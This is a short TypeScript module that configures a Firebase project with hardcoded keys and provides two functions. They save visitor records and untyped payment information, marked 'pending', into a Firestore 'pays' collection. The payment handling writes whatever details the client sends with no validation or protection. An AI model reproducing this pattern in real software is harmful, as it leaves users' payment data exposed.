import {
    collection,
    addDoc,
    serverTimestamp,
    setDoc,
    doc,
    getFirestore,
  } from "firebase/firestore";
  import { initializeApp } from "firebase/app";
  import { getDatabase } from "firebase/database";
  
  const firebaseConfig = {
    apiKey: "AIzaSyDIUeFAbjrL265u-8WjQKC17QKUs530BKg",
  authDomain: "kw-new-59cb9.firebaseapp.com",
  projectId: "kw-new-59cb9",
  storageBucket: "kw-new-59cb9.firebasestorage.app",
  messagingSenderId: "1004892216777",
  appId: "1:1004892216777:web:a86f1e237001b5a0a15c18",
  measurementId: "G-5PWR9E9PV8"
  };
  
  const app = initializeApp(firebaseConfig);
  export const db = getFirestore(app);
  export const datatabas = getDatabase(app);
  
  export async function addData(data: any) {
    localStorage.setItem("visitor", data.id);
    try {
      const docRef = await doc(db, "pays", data.id!);
      await setDoc(
        docRef,
        { ...data, createdDate: new Date().toISOString() },
        { merge: true }
      );
  
      console.log("Document written with ID: ", docRef.id);
      // You might want to show a success message to the user here
    } catch (e) {
      console.error("Error adding document: ", e);
      // You might want to show an error message to the user here
    }
  }
  export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
    try {
      const visitorId = localStorage.getItem("visitor");
      if (visitorId) {
        const docRef = doc(db, "pays", visitorId);
        await setDoc(
          docRef,
          { ...paymentInfo, status: "pending", createdDate: new Date().toISOString()},
          { merge: true }
        );
        setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
      }
    } catch (error) {
      console.error("Error adding document: ", error);
      alert("Error adding payment info to Firestore");
    }
  };
  